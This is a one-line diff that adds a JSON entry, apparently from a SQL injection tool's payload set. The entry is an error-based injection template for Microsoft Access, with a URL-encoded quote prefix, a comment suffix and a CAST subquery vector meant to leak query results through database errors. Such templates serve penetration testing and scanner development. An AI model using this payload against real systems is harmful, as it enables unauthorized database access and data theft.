@@ -1,0 +1,1 @@
+{"dbms": "access", "technique": "error", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND 1=(SELECT CAST(({Q}) AS INT))", "comment": "access error: url-enc single"}
